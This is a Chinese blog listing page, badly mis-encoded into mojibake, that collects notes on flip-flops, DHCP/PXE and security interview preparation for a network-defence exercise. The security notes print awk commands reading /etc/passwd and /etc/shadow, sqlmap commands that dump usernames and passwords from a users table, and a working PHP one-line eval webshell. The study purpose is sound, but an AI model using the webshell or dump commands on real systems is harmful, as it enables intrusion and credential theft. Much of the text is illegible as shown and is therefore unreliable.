<p>ä¸¾ä¾‹ï¼šå¯¹äºç¬¬ä¸€ç‚¹ï¼Œæ¸…é›¶æ— æ•ˆï¼Œç½®ä¸€æœ‰æ•ˆï¼Œæ‰€ä»¥Qç½®ä¸€ã€‚</p>
<p>å‡ ç§è¡¨ç¤ºæ–¹æ³•ï¼š</p>
<p>1ã€çŠ¶æ€è½¬ç§»çœŸå€¼è¡¨ï¼š</p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd6-2-2.png" alt="sd6-2-2"></p>
<p>2ã€ç‰¹å¾æ–¹ç¨‹ï¼š</p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd6-2-3.png" alt="sd6-2-3"></p>
<p>3ã€çŠ¶æ€è½¬ç§»å›¾å’Œæ¿€åŠ±è¡¨</p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd6-2-4.png" alt="sd6-2-4"></p>
<p>4ã€æ³¢å½¢å›¾</p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd6-2-5.png" alt="sd6-2-5"></p>
<p>æˆ–éé—¨æ„é€ çš„RSè§¦å‘å™¨</p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd6-2-6.png" alt="sd6-2-6"></p>
<h3 id="6-3ï¼šæ—¶é’Ÿæ§åˆ¶çš„è§¦å‘å™¨"><a href="#6-3ï¼šæ—¶é’Ÿæ§åˆ¶çš„è§¦å‘å™¨" class="headerlink" title="6-3ï¼šæ—¶é’Ÿæ§åˆ¶çš„è§¦å‘å™¨"></a>6-3ï¼šæ—¶é’Ÿæ§åˆ¶çš„è§¦å‘å™¨</h3><h4 id="é’Ÿæ§RSè§¦å‘å™¨"><a href="#é’Ÿæ§RSè§¦å‘å™¨" class="headerlink" title="é’Ÿæ§RSè§¦å‘å™¨"></a>é’Ÿæ§RSè§¦å‘å™¨</h4><p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd6-3-1.png" alt="sd6-3-1"></p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd6-3-2.png" alt="sd6-3-2">)<img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd6-3-3.png" alt="sd6-3-3"></p>
<h4 id="é’Ÿæ§Dè§¦å‘å™¨"><a href="#é’Ÿæ§Dè§¦å‘å™¨" class="headerlink" title="é’Ÿæ§Dè§¦å‘å™¨"></a>é’Ÿæ§Dè§¦å‘å™¨</h4><p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd6-3-4.png" alt="sd6-3-4"></p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/D:%5Cgitblog%5C1%5Csource_posts%5C%E5%A4%A7%E4%BA%8C%E4%B8%8B%5Csd6-3-5.png" alt="sd6-3-5"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/">åˆ˜è¶…çš„ç½‘ç»œåè®®</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-02</time><div class="content"><h2 id="DHCPåè®®"><a href="#DHCPåè®®" class="headerlink" title="DHCPåè®®"></a>DHCPåè®®</h2><h3 id="è‡ªåŠ¨é…ç½®IPåœ°å€è¿‡ç¨‹"><a href="#è‡ªåŠ¨é…ç½®IPåœ°å€è¿‡ç¨‹" class="headerlink" title="è‡ªåŠ¨é…ç½®IPåœ°å€è¿‡ç¨‹"></a>è‡ªåŠ¨é…ç½®IPåœ°å€è¿‡ç¨‹</h3><h4 id="DHCP-Discoverï¼š"><a href="#DHCP-Discoverï¼š" class="headerlink" title="DHCP Discoverï¼š"></a>DHCP Discoverï¼š</h4><p>æ–°æ¥çš„æœºå™¨å‘å¹¿æ’­åŒ…ï¼ˆå¹¿æ’­åŒ…å°è£…äº† UDPï¼ŒUDP å°è£…äº† BOOTPã€‚å…¶å® DHCP æ˜¯ BOOTP çš„å¢å¼ºç‰ˆï¼Œä½†æ˜¯å¦‚æœä½ å»æŠ“åŒ…çš„è¯ï¼Œå¾ˆå¯èƒ½çœ‹åˆ°çš„åç§°è¿˜æ˜¯ <strong>BOOTP åè®®</strong>ã€‚ï¼‰<img src="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-1.png" alt="1-1"></p>
<h4 id="DHCP-Offerï¼š"><a href="#DHCP-Offerï¼š" class="headerlink" title="DHCP Offerï¼š"></a>DHCP Offerï¼š</h4><p>DHCP Serveræä¾›ç»™æ–°æ¥çš„æœºå™¨ä¸€ä¸ªIPåœ°å€ï¼›åŒæ—¶ï¼ŒDHCP Server ä¸ºæ­¤å®¢æˆ·ä¿ç•™ä¸ºå®ƒæä¾›çš„ IP åœ°å€ï¼Œä»è€Œä¸ä¼šä¸ºå…¶ä»– DHCP å®¢æˆ·åˆ†é…æ­¤ IP åœ°å€ã€‚ï¼ˆè¿™é‡Œï¼ŒDHCP Serverä¹‹æ‰€ä»¥çŸ¥é“å®ƒæ˜¯æ–°æ¥çš„æœºå™¨ï¼Œé çš„æ˜¯å®ƒçš„MACåœ°å€ï¼Œè¿™å°±æ˜¯<strong>MACåœ°å€å”¯ä¸€</strong>çš„é‡è¦æ€§äº†ï¼‰</p>
<p><img src="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-2.png" alt="1-2"></p>
<h4 id="DHCP-Requestï¼š"><a href="#DHCP-Requestï¼š" class="headerlink" title="DHCP Requestï¼š"></a>DHCP Requestï¼š</h4><p>å¦‚æœæœ‰å¤šä¸ªDHCPæœåŠ¡å™¨ï¼Œæ–°çš„æœºå™¨ä¼šé€‰æ‹©å…¶ä¸­ä¸€ä¸ª DHCP Offerï¼Œä¸€èˆ¬æ˜¯æœ€å…ˆåˆ°è¾¾çš„é‚£ä¸ªï¼Œå¹¶ä¸”ä¼šå‘ç½‘ç»œå‘é€ä¸€ä¸ª DHCP Request å¹¿æ’­æ•°æ®åŒ…ã€‚<img src="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-3.png" alt="1-3"></p>
<h4 id="DHCP-ACK"><a href="#DHCP-ACK" class="headerlink" title="DHCP ACK:"></a>DHCP ACK:</h4><p>å½“ DHCP Server æ¥æ”¶åˆ°å®¢æˆ·æœºçš„ DHCP request ä¹‹åï¼Œä¼šå¹¿æ’­è¿”å›ç»™å®¢æˆ·æœºä¸€ä¸ª DHCP ACK æ¶ˆæ¯åŒ…ï¼Œè¡¨æ˜å·²ç»æ¥å—å®¢æˆ·æœºçš„é€‰æ‹©ï¼Œå¹¶å°†è¿™ä¸€ IP åœ°å€çš„åˆæ³•ç§Ÿç”¨ä¿¡æ¯å’Œå…¶ä»–çš„é…ç½®ä¿¡æ¯éƒ½æ”¾å…¥è¯¥å¹¿æ’­åŒ…ï¼Œå‘ç»™å®¢æˆ·æœºï¼Œæ¬¢è¿å®ƒåŠ å…¥ç½‘ç»œå¤§å®¶åº­ã€‚<img src="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-4.png" alt="1-4"></p>
<h3 id="é¢„å¯åŠ¨æ‰§è¡Œç¯å¢ƒï¼ˆPXEï¼‰"><a href="#é¢„å¯åŠ¨æ‰§è¡Œç¯å¢ƒï¼ˆPXEï¼‰" class="headerlink" title="é¢„å¯åŠ¨æ‰§è¡Œç¯å¢ƒï¼ˆPXEï¼‰"></a>é¢„å¯åŠ¨æ‰§è¡Œç¯å¢ƒï¼ˆPXEï¼‰</h3><ol>
<li><p>é¦–å…ˆï¼Œå¯åŠ¨ BIOSï¼Œè¯»å–ç¡¬ç›˜çš„ MBR å¯åŠ¨æ‰‡åŒºï¼Œå°† GRUB å¯åŠ¨èµ·æ¥</p>
</li>
<li><p>ç„¶åå°†æƒåŠ›äº¤ç»™ GRUBï¼ŒGRUB åŠ è½½å†…æ ¸ã€åŠ è½½ä½œä¸ºæ ¹æ–‡ä»¶ç³»ç»Ÿçš„ initramfs æ–‡ä»¶</p>
</li>
<li><p>ç„¶åå°†æƒåŠ›äº¤ç»™å†…æ ¸</p>
</li>
<li><p>æœ€åå†…æ ¸å¯åŠ¨ï¼Œåˆå§‹åŒ–æ•´ä¸ªæ“ä½œç³»ç»Ÿã€‚</p>
</li>
</ol>
<p>   å¯åŠ¨BIOSåæ‰§è¡ŒPXEè¿‡ç¨‹</p>
<p>   <img src="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-5.png" alt="1-5"></p>
<h1 id="ç½‘ç»œå±‚"><a href="#ç½‘ç»œå±‚" class="headerlink" title="ç½‘ç»œå±‚"></a>ç½‘ç»œå±‚</h1><h1 id="ä¼ è¾“å±‚"><a href="#ä¼ è¾“å±‚" class="headerlink" title="ä¼ è¾“å±‚"></a>ä¼ è¾“å±‚</h1><h1 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h1></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/02/09/%E6%8A%A4%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/">æŠ¤ç½‘å­¦ä¹ èµ„æ–™</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-02-09</time><div class="content"><p>æŸ¥è¯¢idä¸º0çš„ç”¨æˆ·åç§°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>



<p>æŸ¥è¯¢ç©ºå¯†ç ç”¨æˆ·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#39;length($2)&#x3D;&#x3D;0 &#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;proc</span><br></pre></td></tr></table></figure>













<h1 id="03-12åŸ¹è®­ç¬”è®°"><a href="#03-12åŸ¹è®­ç¬”è®°" class="headerlink" title="03.12åŸ¹è®­ç¬”è®°"></a>03.12åŸ¹è®­ç¬”è®°</h1><h2 id="æŠ¤ç½‘è¡ŒåŠ¨ä¸‰ä¸ªé˜¶æ®µ"><a href="#æŠ¤ç½‘è¡ŒåŠ¨ä¸‰ä¸ªé˜¶æ®µ" class="headerlink" title="æŠ¤ç½‘è¡ŒåŠ¨ä¸‰ä¸ªé˜¶æ®µ"></a>æŠ¤ç½‘è¡ŒåŠ¨ä¸‰ä¸ªé˜¶æ®µ</h2><ol>
<li>å¤‡æˆ˜é˜¶æ®µï¼šå“ªäº›å·¥ä½œï¼Ÿ1-å‡å°‘æ”»å‡»é¢ 2-æ’æŸ¥é£é™©ç‚¹å‡å°æ”»å‡»é¢å°±æ˜¯ç¼©å°æš´éœ²é¢ã€‚å¯¹å…¬å¸èµ„äº§è¿›è¡Œæ¢³ç†ï¼Œç„¶åå¯¹èµ„äº§è¿›è¡Œï¼š<br>1ã€å…³é—­ä¸åœ¨ç”¨çš„ä¸šåŠ¡ç³»ç»Ÿï¼›<br>2ã€å…³é—­é‡è¦ç³»ç»Ÿå¤–ç½‘è®¿é—®é€šé“ï¼Œé€šè¿‡VPNè¿›è¡Œä¸šåŠ¡æ“ä½œã€‚<br>æ’æŸ¥é£é™©ç‚¹ï¼Œæ˜¯å¯¹å…¬å¸èµ„äº§è¿›è¡Œæ¼æ´æ‰«æã€æ¸—é€æµ‹è¯•ã€å¼±å£ä»¤æ‰«æï¼ŒåŸºçº¿æ£€æŸ¥å‘<br>ç°å­˜åœ¨çš„é£é™©é—®é¢˜ã€‚ç„¶åå¯¹é£é™©é—®é¢˜è¿›è¡ŒåŠ å›ºæ•´æ”¹åŠé£é™©é—®é¢˜å¤æµ‹ã€‚</li>
<li>ä¸´æˆ˜é˜¶æ®µï¼šè¿›è¡Œå†…éƒ¨æ”»é˜²æ¼”ç»ƒï¼Œå‘ç°å¤‡æˆ˜å¿½ç•¥çš„é£é™©ã€‚ï¼ˆå…·ä½“æ“ä½œï¼‰<br>å¯¹åŸæœ¬å·²æœ‰çš„ä¸€äº›å®‰å…¨è®¾å¤‡è¿›è¡Œç­–ç•¥ä¼˜åŒ–ï¼ŒåŒæ—¶ä¹Ÿæ–°å¢äº†ä¸€äº›å®‰å…¨è®¾å¤‡</li>
<li>å†³æˆ˜é˜¶æ®µï¼š7*24å°æ—¶ï¼Œè¦è¯´åšè¿‡æŠ¤ç½‘ã€‚åˆ©ç”¨ç›‘æµ‹æ‰‹æ®µåšå¥½å¯¹è‡ªæœ‰ç³»ç»Ÿå®‰å…¨äº‹ä»¶ç›‘æµ‹ä¸<br>é˜²å¾¡ï¼Œå‘ç°æ”»å‡»äº‹ä»¶ç«‹å³ä¸ŠæŠ¥å¹¶åšå¥½åº”æ€¥å¤„ç½®ã€‚æŒç»­ä¼˜åŒ–é˜²æŠ¤æ‰‹æ®µï¼ŒæŒç»­å¯¹å®‰å…¨<br>é£é™©è¿›è¡ŒåŠ å›ºæ•´æ”¹ã€‚</li>
<li>æ€»ç»“é˜¶æ®µï¼ˆæ¼”ä¹ ç»“æœé€šæŠ¥è‡³é€šæŠ¥åä¸¤å‘¨ï¼‰<br>å®‰å…¨åŠ å›ºå°ç»„è¿›è¡Œé˜²æŠ¤æ€»ç»“ã€‚<br>å®‰å…¨ç›‘æ§å°ç»„ç›‘æ§æ€»ç»“ã€‚</li>
</ol>
<h2 id="åº”æ€¥å“åº”åšäº›ä»€ä¹ˆ"><a href="#åº”æ€¥å“åº”åšäº›ä»€ä¹ˆ" class="headerlink" title="åº”æ€¥å“åº”åšäº›ä»€ä¹ˆ"></a>åº”æ€¥å“åº”åšäº›ä»€ä¹ˆ</h2><p>åˆ†ä¸ºäº”ä¸ªéƒ¨åˆ†ï¼š</p>
<ol>
<li>æ”¶é›†ä¿¡æ¯ï¼šæ”¶é›†å®¢æˆ·ä¿¡æ¯å’Œä¸­æ¯’ä¸»æœºä¿¡æ¯ï¼ŒåŒ…æ‹¬æ ·æœ¬ã€‚</li>
<li>åˆ¤æ–­ç±»å‹ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯å®‰å…¨äº‹ä»¶ï¼Œä½•ç§å®‰å…¨äº‹ä»¶ï¼Œå‹’ç´¢ã€æŒ–çŸ¿ã€æ–­ç½‘ã€DoSç­‰<br>ç­‰ã€‚</li>
<li>æ·±å…¥åˆ†æï¼šæ—¥å¿—åˆ†æã€è¿›ç¨‹åˆ†æã€å¯åŠ¨é¡¹åˆ†æã€æ ·æœ¬åˆ†æã€‚</li>
<li>æ¸…ç†å¤„ç½®ï¼šç›´æ¥æ€æ‰è¿›ç¨‹ï¼Œåˆ é™¤æ–‡ä»¶ï¼Œæ‰“è¡¥ä¸ï¼ŒæŠ‘æˆ–æ˜¯ä¿®å¤æ–‡ä»¶ã€‚</li>
<li>äº§å‡ºæŠ¥å‘Šï¼šæ•´ç†å¹¶è¾“å‡ºå®Œæ•´çš„å®‰å…¨äº‹ä»¶æŠ¥å‘Šã€‚</li>
</ol>
<h2 id="å¸¸ç”¨çš„å®‰å…¨å·¥å…·ï¼Ÿæ‰«æç«¯å£å·¥å…·ï¼Ÿ"><a href="#å¸¸ç”¨çš„å®‰å…¨å·¥å…·ï¼Ÿæ‰«æç«¯å£å·¥å…·ï¼Ÿ" class="headerlink" title="å¸¸ç”¨çš„å®‰å…¨å·¥å…·ï¼Ÿæ‰«æç«¯å£å·¥å…·ï¼Ÿ"></a>å¸¸ç”¨çš„å®‰å…¨å·¥å…·ï¼Ÿæ‰«æç«¯å£å·¥å…·ï¼Ÿ</h2><p>ç«¯å£åŠæ¼æ´æ‰«æï¼šnmapï¼Œnessus</p>
<p>æ•°æ®æŠ“åŒ…ï¼šwiresharkï¼Œburpsuite</p>
<p>åº”ç”¨å®‰å…¨æµ‹è¯•ï¼šburpsuite</p>
<p>webè‡ªåŠ¨åŒ–å®‰å…¨æ‰«æï¼šawvsï¼Œappscan</p>
<h2 id="sftpï¼Œtelnetï¼Œsshç«¯å£ï¼Ÿ"><a href="#sftpï¼Œtelnetï¼Œsshç«¯å£ï¼Ÿ" class="headerlink" title="sftpï¼Œtelnetï¼Œsshç«¯å£ï¼Ÿ"></a>sftpï¼Œtelnetï¼Œsshç«¯å£ï¼Ÿ</h2><p>sftpï¼š22ã€telnetï¼š23ã€sshï¼š22</p>
<p>SSHå’ŒtelnetåŒºåˆ«ï¼šSSHåŠ å¯†ä¼ è¾“ï¼Œtelnetæ˜æ–‡çº¯å±æ•°æ®</p>
<h2 id="æ“ä½œè¿‡ä»€ä¹ˆé˜²ç«å¢™è®¾å¤‡ï¼Ÿå¸¸è§çš„é˜²ç«å¢™å‚å®¶å“ªäº›ï¼Ÿ"><a href="#æ“ä½œè¿‡ä»€ä¹ˆé˜²ç«å¢™è®¾å¤‡ï¼Ÿå¸¸è§çš„é˜²ç«å¢™å‚å®¶å“ªäº›ï¼Ÿ" class="headerlink" title="æ“ä½œè¿‡ä»€ä¹ˆé˜²ç«å¢™è®¾å¤‡ï¼Ÿå¸¸è§çš„é˜²ç«å¢™å‚å®¶å“ªäº›ï¼Ÿ"></a>æ“ä½œè¿‡ä»€ä¹ˆé˜²ç«å¢™è®¾å¤‡ï¼Ÿå¸¸è§çš„é˜²ç«å¢™å‚å®¶å“ªäº›ï¼Ÿ</h2><p><strong>å®è¯å®è¯´</strong></p>
<p>æ“ä½œè¿‡<strong>ä¸»æœºé˜²ç«å¢™</strong>ï¼Œé˜¿é‡Œäº‘å’Œè…¾è®¯äº‘WAFï¼Œé•¿äº­WAFï¼Œé˜¿é‡Œäº‘é˜²ç«å¢™ã€‚</p>
<p>å‚å®¶ï¼šæ·±ä¿¡æœã€å±±çŸ³ç½‘ç§‘ã€ç»¿ç›Ÿã€é•¿äº­</p>
<h2 id="å¯¹ç½‘ç»œåè®®äº†è§£å¤šå°‘ï¼Ÿ"><a href="#å¯¹ç½‘ç»œåè®®äº†è§£å¤šå°‘ï¼Ÿ" class="headerlink" title="å¯¹ç½‘ç»œåè®®äº†è§£å¤šå°‘ï¼Ÿ"></a>å¯¹ç½‘ç»œåè®®äº†è§£å¤šå°‘ï¼Ÿ</h2><p>ç½‘ç»œåè®®æ˜¯ä¸ºè®¡ç®—æœºç½‘ç»œä¸­è¿›è¡Œäº¤æ¢è€Œå»ºç«‹çš„è§„åˆ™ã€æ ‡å‡†æˆ–çº¦å®šé›†åˆã€‚</p>
<p>å¸¸è§ï¼šHTTPã€FTPã€TELNET</p>
<p>ç‰©ç†å±‚ï¼šä»¥å¤ªç½‘Â·è°ƒåˆ¶è§£è°ƒå™¨Â·ç”µåŠ›çº¿é€šä¿¡<br>(PLC)Â·SONET/SDHÂ·G.709Â·å…‰å¯¼çº¤ç»´Â·åŒè½´ç”µç¼†Â·åŒç»çº¿ç­‰</p>
<p>æ•°æ®é“¾è·¯å±‚ï¼šWi-Fi(IEEE802.11)Â·WiMAX(IEEE<br>802.16)Â·ATMÂ·DTMÂ·ä»¤ç‰Œç¯Â·ä»¥å¤ªç½‘Â·FDDIÂ·å¸§ä¸­<br>ç»§Â·GPRSÂ·EVDOÂ·HSPAÂ·HDLCÂ·PPPÂ·L2TPÂ·PPTPÂ·ISDNÂ·STPÂ·<br>CSMA/CDç­‰</p>
<p>ç½‘ç»œå±‚åè®®ï¼šIP<br>(IPv4Â·IPv6)Â·ICMPÂ·ICMPv6Â·IGMPÂ·IS-ISÂ·IPsecÂ·ARPÂ·RARP<br>Â·RIPç­‰</p>
<p>ä¼ è¾“å±‚åè®®ï¼šTCPÂ·UDPÂ·TLSÂ·DCCPÂ·SCTPÂ·RSVPÂ·OSPFç­‰</p>
<p>åº”ç”¨å±‚åè®®ï¼š<br>DHCPÂ·DNSÂ·FTPÂ·GopherÂ·HTTPÂ·IMAP4Â·IRCÂ·NNTPÂ·XMPP<br>Â·POP3Â·SIPÂ·SMTPÂ·SNMPÂ·SSHÂ·TELNETÂ·RPCÂ·RTCPÂ·RTPÂ·RTSPÂ·<br>SDPÂ·SOAPÂ·GTPÂ·STUNÂ·NTPÂ·SSDPÂ·BGPç­‰</p>
<h2 id="åšè¿‡ä»€ä¹ˆäº§å“ï¼ˆå²—ä½ï¼‰ï¼Ÿæœ‰æ²¡æœ‰åšè¿‡æ•°æ®åº“ç›¸å…³å·¥ä½œï¼Ÿ"><a href="#åšè¿‡ä»€ä¹ˆäº§å“ï¼ˆå²—ä½ï¼‰ï¼Ÿæœ‰æ²¡æœ‰åšè¿‡æ•°æ®åº“ç›¸å…³å·¥ä½œï¼Ÿ" class="headerlink" title="åšè¿‡ä»€ä¹ˆäº§å“ï¼ˆå²—ä½ï¼‰ï¼Ÿæœ‰æ²¡æœ‰åšè¿‡æ•°æ®åº“ç›¸å…³å·¥ä½œï¼Ÿ"></a>åšè¿‡ä»€ä¹ˆäº§å“ï¼ˆå²—ä½ï¼‰ï¼Ÿæœ‰æ²¡æœ‰åšè¿‡æ•°æ®åº“ç›¸å…³å·¥ä½œï¼Ÿ</h2><p><strong>å®è¯å®è¯´</strong></p>
<p>å²—ä½ï¼š</p>
<h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><p>æ¸—é€æµ‹è¯•æ˜¯é€šè¿‡æ¨¡æ‹Ÿæ¶æ„é»‘å®¢çš„æ”»å‡»æ–¹æ³•ï¼Œæ¥è¯„ä¼°è®¡ç®—æœºç½‘ç»œç³»ç»Ÿå®‰å…¨çš„ä¸€ç§<br>è¯„ä¼°æ–¹æ³•ã€‚ä»¥åˆ©ç”¨å„ç§æ‰‹æ®µå¯¹æŸä¸ªç‰¹å®šç½‘ç»œè¿›è¡Œæµ‹è¯•ï¼Œä»¥æœŸå‘ç°å’ŒæŒ–æ˜ç³»ç»Ÿä¸­å­˜åœ¨<br>çš„æ¼æ´ï¼Œç„¶åè¾“å‡ºæ¸—é€æµ‹è¯•æŠ¥å‘Šï¼Œå¹¶æäº¤ç»™ç½‘ç»œæ‰€æœ‰è€…ã€‚ç½‘ç»œæ‰€æœ‰è€…æ ¹æ®æ¸—é€äººå‘˜<br>æä¾›çš„æ¸—é€æµ‹è¯•æŠ¥å‘Šï¼Œå¯ä»¥æ¸…æ™°çŸ¥æ™“ç³»ç»Ÿä¸­å­˜åœ¨çš„å®‰å…¨éšæ‚£å’Œé—®é¢˜ã€‚</p>
<h2 id="sqlæ³¨å…¥çš„åŸç†åŠé˜²æŠ¤ï¼Ÿ"><a href="#sqlæ³¨å…¥çš„åŸç†åŠé˜²æŠ¤ï¼Ÿ" class="headerlink" title="sqlæ³¨å…¥çš„åŸç†åŠé˜²æŠ¤ï¼Ÿ"></a>sqlæ³¨å…¥çš„åŸç†åŠé˜²æŠ¤ï¼Ÿ</h2><p>åŸç†ï¼šç”¨æˆ·å°†æ¶æ„çš„SQLè¯­å¥æ’å…¥åˆ°åº”ç”¨çš„è¾“å…¥å‚æ•°ä¸­ï¼Œåå°SQLæœåŠ¡<br>å™¨è§£ææ‰§è¡Œæ¶æ„SQLè¯­å¥ï¼Œå½¢æˆSQLæ³¨å…¥æ”»å‡»ã€‚</p>
<p>ç±»å‹ï¼šæŠ¥é”™å‹ï¼Œæ—¶é—´å‹ï¼Œç›²æ³¨</p>
<p>é˜²æŠ¤:</p>
<ol>
<li>è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„æ¶æ„å­—ç¬¦</li>
<li>ä½¿ç”¨é¢„ç¼–è¯‘ï¼šæå‰å°†sqlè¯­å¥å‘ç»™æ•°æ®åº“è¿›è¡Œé¢„ç¼–è¯‘ï¼Œæ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½ä¼šæ­£å¸¸æ‰§è¡Œï¼Œä¸ä¼šå½±å“åŸæ¥çš„é€»è¾‘ã€‚</li>
</ol>
<p>sqlæ‰‹å·¥æ³¨å…¥ï¼š</p>
<h3 id="sqlmapï¼š"><a href="#sqlmapï¼š" class="headerlink" title="sqlmapï¼š"></a>sqlmapï¼š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u ç½‘å€ --dbs</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u ç½‘å€ -D security --tables</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u ç½‘å€ -D security -T users --columns</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u ç½‘å€ -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure>



<h2 id="XSSæ”»å‡»å’Œé˜²æŠ¤"><a href="#XSSæ”»å‡»å’Œé˜²æŠ¤" class="headerlink" title="XSSæ”»å‡»å’Œé˜²æŠ¤"></a>XSSæ”»å‡»å’Œé˜²æŠ¤</h2><p>åŸç†ï¼šæµè§ˆå™¨æ‰§è¡Œç”¨æˆ·è¾“å…¥çš„JSä»£ç </p>
<p>é˜²æŠ¤ï¼š</p>
<ol>
<li>æœåŠ¡ç«¯è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„å±é™©å­—ç¬¦ã€è¿‡æ»¤scriptï¼Œhrefã€‘</li>
<li>å¯¹è¾“å‡ºå†…å®¹è¿›è¡ŒHTMLå®ä½“ç¼–ç ã€htmlspecialcharã€‘</li>
</ol>
<h2 id="PHPä¸€å¥è¯æœ¨é©¬æ€ä¹ˆå†™ï¼Ÿ"><a href="#PHPä¸€å¥è¯æœ¨é©¬æ€ä¹ˆå†™ï¼Ÿ" class="headerlink" title="PHPä¸€å¥è¯æœ¨é©¬æ€ä¹ˆå†™ï¼Ÿ"></a>PHPä¸€å¥è¯æœ¨é©¬æ€ä¹ˆå†™ï¼Ÿ</h2><p><code>&lt;?php @eval($_POST[&#39;ag&#39;]); ?&gt;</code></p>
<p>evalå‡½æ•°å°†æ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²å½“ä»£ç æ‰§è¡Œã€‚</p>
<h2 id="ååºåˆ—åŒ–æ¼æ´æˆå› "><a href="#ååºåˆ—åŒ–æ¼æ´æˆå› " class="headerlink" title="ååºåˆ—åŒ–æ¼æ´æˆå› "></a>ååºåˆ—åŒ–æ¼æ´æˆå› </h2><p><strong>åºåˆ—åŒ–ï¼š</strong>å°†å¯¹è±¡è½¬åŒ–ä¸ºä¾¿äºä¼ è¾“çš„æ ¼å¼ï¼Œ å¸¸è§çš„åºåˆ—åŒ–æ ¼å¼ï¼šäºŒè¿›åˆ¶æ ¼å¼ï¼Œå­—èŠ‚æ•°ç»„ï¼Œjsonå­—ç¬¦ä¸²ï¼Œxmlå­—ç¬¦ä¸²ã€‚</p>
<p><strong>ååºåˆ—åŒ–ï¼š</strong>å°†åºåˆ—åŒ–çš„æ•°æ®æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ã€‚</p>
<p><strong>ååºåˆ—åŒ–æ¼æ´æˆå› ï¼š</strong><br>å½“è¾“å…¥çš„ååºåˆ—åŒ–çš„æ•°æ®å¯è¢«ç”¨æˆ·æ§åˆ¶ï¼Œé‚£ä¹ˆæ”»å‡»è€…å³å¯é€šè¿‡æ„é€ æ¶æ„è¾“å…¥ï¼Œè®©å<br>åºåˆ—åŒ–äº§ç”Ÿéé¢„æœŸçš„å¯¹è±¡ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­æ‰§è¡Œæ„é€ çš„ä»»æ„ä»£ç ã€‚</p>
<h2 id="JBossMQ-JMSååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-7504ï¼‰æ€ä¹ˆå‘ç°çš„ï¼Ÿ"><a href="#JBossMQ-JMSååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-7504ï¼‰æ€ä¹ˆå‘ç°çš„ï¼Ÿ" class="headerlink" title="JBossMQ JMSååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-7504ï¼‰æ€ä¹ˆå‘ç°çš„ï¼Ÿ"></a>JBossMQ JMSååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-7504ï¼‰æ€ä¹ˆå‘ç°çš„ï¼Ÿ</h2><p>JavaDeserH2HCå·¥å…·åˆ©ç”¨è¯¥æ¼æ´ï¼Ÿ</p>
